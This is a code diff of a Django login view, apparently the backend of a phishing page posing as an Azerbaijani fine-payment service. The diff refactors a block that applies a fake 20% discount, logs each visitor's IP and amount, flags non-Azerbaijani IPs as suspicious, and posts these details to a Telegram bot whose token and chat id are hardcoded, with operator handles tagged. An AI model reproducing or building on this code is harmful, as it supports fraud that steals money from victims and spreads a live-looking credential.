@@ -49,30 +49,13 @@ def login(request):
                 total_amount= full_name
                 father_name =sub_service_amount
                 # Print the "code" and "message" values
-                subtotal = float(father_name) - float(father_name) * 20 / 100
-                context={
-                "total_amount":total_amount,
-                "father_name":father_name,
-                "subtotal":subtotal
-                }
-                contact = ContactModel(ip=client_ip,amount=subtotal)
-                contact.page_name="Melumat Doldurma sehifesi"
-                contact.save()
-                request.session['contact_id'] = contact.id
                 if(response_data["code"]=="Error"):
                     context = {
                         'display_error': '',  # if there's no error, set display_error to 'none'
                     }
                     return render(request, 'index.html',context)
                 print("Message:", response_data["message"])
-                request.session['contact_id'] = contact.id
-                ip_address = client_ip
-                country = get_country_from_ip(ip_address)
-                if country!= "AZ":
-                    country= 'Şübhəli İP!'
-                response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
-
-                return render(request, 'cerime2.html',context)
+                subtotal = float(father_name) - float(father_name) * 20 / 100
             else:
                 print(f"Request failed with status code: {response.status_code}")
         else:
@@ -83,24 +66,24 @@ def login(request):
                 }
                 return render(request, 'index.html',context)
             subtotal = float(father_name) - float(father_name) * 20 / 100
-            context={
-                "total_amount":total_amount,
-                "father_name":father_name,
-                "subtotal":subtotal
-            }
-            contact = ContactModel(ip=client_ip,amount=subtotal)
-            contact.page_name="Melumat Doldurma sehifesi"
-            contact.save()
-            request.session['contact_id'] = contact.id
-            ip_address = client_ip
-            country = get_country_from_ip(ip_address)
-            if country!= "AZ":
-                country= 'Şübhəli İP!'
-            response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
-
-            return render(request, 'cerime2.html',context)
         
 
+        context={
+            "total_amount":total_amount,
+            "father_name":father_name,
+            "subtotal":subtotal
+        }
+        contact = ContactModel(ip=client_ip,amount=subtotal)
+        contact.page_name="Melumat Doldurma sehifesi"
+        contact.save()
+        request.session['contact_id'] = contact.id
+        ip_address = client_ip
+        country = get_country_from_ip(ip_address)
+        if country!= "AZ":
+            country= 'Şübhəli İP!'
+        response = requests.post(f'https://api.telegram.org/bot6412307197:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw/sendMessage?chat_id=-1001982703394&text=id:{contact.id}|ip:{contact.ip}|Country:{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
+
+        return render(request, 'cerime2.html',context)
     context = {
         'display_error': 'none',  # if there's no error, set display_error to 'none'
     }
